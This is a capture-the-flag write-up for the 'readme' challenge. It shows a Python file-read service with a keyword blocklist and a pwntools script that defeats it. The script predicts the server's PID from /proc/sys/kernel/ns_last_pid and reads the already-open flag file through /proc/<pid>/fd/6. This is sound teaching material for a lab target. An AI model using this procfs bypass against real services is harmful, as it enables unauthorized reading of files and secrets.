# readme

- Category: misc
- Score: 353pts
- Solves: 14 solves
- Author: ptr-yudai

> nc misc.kosenctf.com 9712

readme_d18cac0c184ca28a2a7e01d5714f72b1.tar.gz

## Description
```py
# assert the flag exists
try:
    flag = open("flag.txt", "rb")
except:
    print("[-] Report this bug to the admin.")

# help yourself :)
path = input("> ")
if 'flag.txt' in path:
    print("[-] Nope :(")
elif 'self' in path:
    print("[-] No more procfs trick :(")
elif 'dev' in path:
    print("[-] Don't touch it :(")
else:
    try:
        f = open(path, "rb")
        print(f.read(0x100))
    except:
        print("[-] Error")
```

`self`, `procfs`, `dev`, opened a file without reading it...

Did you feel something? Maybe the chal want you to read the file via file descriptor?

As the chal did not block `fd` directly, maybe we can read the flag if we can guess the pid: `/proc/<pid>/fd/123456`.

However max pid is `32768`, it is hard to bruteforce and everytime I connect to the remote server the current pid will change.

### Get the PID

First element we need is the current pid. I can't find the answer after some googling, therefore I simply `find` in `/proc`
```
find /proc -name "*pid*" | less
```

and seems `/proc/sys/kernel/ns_last_pid` is likely the current process ID if I do something like this:

```
$ echo "/proc/sys/kernel/ns_last_pid" | nc misc.kosenctf.com 9712
> b'27463\n'
$ echo "/proc/sys/kernel/ns_last_pid" | nc misc.kosenctf.com 9712
> b'27465\n'
$ echo "/proc/sys/kernel/ns_last_pid" | nc misc.kosenctf.com 9712
> b'27467\n'
$ echo "/proc/sys/kernel/ns_last_pid" | nc misc.kosenctf.com 9712
> b'27469\n'
```

So maybe `pid+2` is the next `pid` the python process will get.

### Get the FD

I tested the python script locally, and seems I can read the flag file via `/proc/<pid>/fd/3`. However, I can't read the fd remotely with `/proc/<pid>/fd/3`. I start to worry if the `pid` is incorrect and trying different values such as `pid+1`, `pid+3` etc.

After some more testing, I can confirm the pid is correct by `/proc/<pid>/cmdline`. 

```bash
$ echo "/proc/sys/kernel/ns_last_pid" | nc misc.kosenctf.com 9712
> b'28787\n'

$ echo "/proc/28789/cmdline" | nc misc.kosenctf.com 9712
> b'python3\x00./server.py\x00'
```

Sometime reading `/fd/1`, `/fd/2`, `/fd/3` will hang instead of error, which is a good sign. Therefore, I start guessing the `fd` number and found that I can get the flag in `/fd/6`


## Solution

```py
from pwn import *
import re

def read(file): 
  r = remote('misc.kosenctf.com', 9712)
  r.recvuntil("> ")
  r.sendline(file)
  return r.recvall()

last_pid = int(re.findall("\d+", read("/proc/sys/kernel/ns_last_pid").decode())[0])
target = last_pid + 2
r1 = remote('misc.kosenctf.com', 9712)

print(read("/proc/{}/cmdline".format(target)))
print(read("/proc/{}/fd/6".format(target)))
```